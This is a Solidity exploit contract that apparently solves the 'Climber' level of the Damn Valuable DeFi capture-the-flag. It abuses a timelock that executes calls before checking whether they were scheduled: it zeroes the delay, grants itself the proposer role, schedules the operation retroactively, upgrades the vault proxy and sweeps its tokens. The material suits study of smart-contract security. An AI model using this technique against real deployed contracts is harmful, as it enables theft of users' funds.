pragma solidity ^0.8.0;

import "./ClimberVault.sol";
import "./ClimberTimelock.sol";
import "../DamnValuableToken.sol";
import "./AttackerClimberVault.sol";

import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "./ClimberConstants.sol";

contract AttackerClimber {
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    struct AttackOperation {
        address[] targets;
        uint256[] values;
        bytes[] data;
        bytes32 salt;
    }

    AttackOperation op;

    constructor (ClimberVault vault_, DamnValuableToken token_) {
        vault = vault_;
        timelock = ClimberTimelock(payable(vault.owner()));
        token = token_;
    }

    function addTimelockOperation() external {
        timelock.schedule(op.targets, op.values, op.data, op.salt);
    }

    function attack(address player) external {
        // Step 0 - timelock updateDelay
        op.targets.push(address(timelock));
        op.data.push(abi.encodeWithSignature("updateDelay(uint64)", uint256(0)));
        op.values.push(uint(0));

        // Step 1 - grant timelock proposer role to address(this)
        op.targets.push(address(timelock));
        op.data.push(abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this)));
        op.values.push(uint(0));

        // Step 2 - add current operation to timelock
        op.targets.push(address(this));
        op.data.push(abi.encodeWithSignature("addTimelockOperation()"));
        op.values.push(uint(0));

        // Step 3 - upgrade vault and call initialize
        AttackerClimberVault vault_ = new AttackerClimberVault();
        op.targets.push(address(vault));
        op.data.push(
            abi.encodeWithSignature("upgradeTo(address)",
                address(address(vault_))
            )
        );
        op.values.push(uint(0));

        // Step 4 - execute operation
        timelock.execute(op.targets, op.values, op.data, op.salt);

        // Step 5 - sweep funds
        AttackerClimberVault(address(vault)).sweepFunds(address(token), player);
    }
}